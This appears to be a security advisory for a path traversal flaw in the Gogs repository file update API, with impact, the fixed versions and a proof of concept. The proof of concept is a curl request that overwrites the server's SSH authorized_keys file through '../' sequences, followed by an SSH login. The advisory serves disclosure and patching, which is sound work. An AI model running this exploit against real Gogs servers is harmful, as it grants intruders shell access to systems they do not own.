summary: "Path Traversal in file update API in gogs\n### Impact\n\nThe malicious user is able\
  \ to write a file to an arbitrary path on the server to gain SSH access to the server. \n\n\
  ### Patches\n\nWriting files outside repository Git directory has been prohibited via the\
  \ repository file update API (https://github.com/gogs/gogs/pull/7859). Users should upgrade\
  \ to 0.13.1 or the latest 0.14.0+dev.\n\n### Workarounds\n\nNo viable workaround available,\
  \ please only grant access to trusted users to your Gogs instance on affected versions.\n\n\
  ### References\n\nn/a\n\n### Proof of Concept\n\n1. Generate a Personal Access Tokens\n2.\
  \ Edit any file on the server with this\n\n    ```bash\n    curl -v --path-as-is -X PUT --url\
  \ \"http://localhost:10880/api/v1/repos/Test/bbcc/contents/../../../../../../../../home/git/.ssh/authorized_keys\"\
  \ \\\n    -H \"Authorization: token eaac23cf58fc76bbaecd686ec52cd44d903db9bf\" \\\n    -H\
  \ \"Content-Type: application/json\" \\\n    --data '{\n      \"message\": \"an\",\n     \
  \ \"content\": \"<base64encoded: your ssh pub key>\"\n    }'\n    ```\n\n3. ssh connect to\
  \ remote server\n\n    ```bash\n    ssh -i temp git@localhost -p 10022\n    ```\n\n### For\
  \ more information\nIf you have any questions or comments about this advisory, please post\
  \ on https://github.com/gogs/gogs/issues/7582."
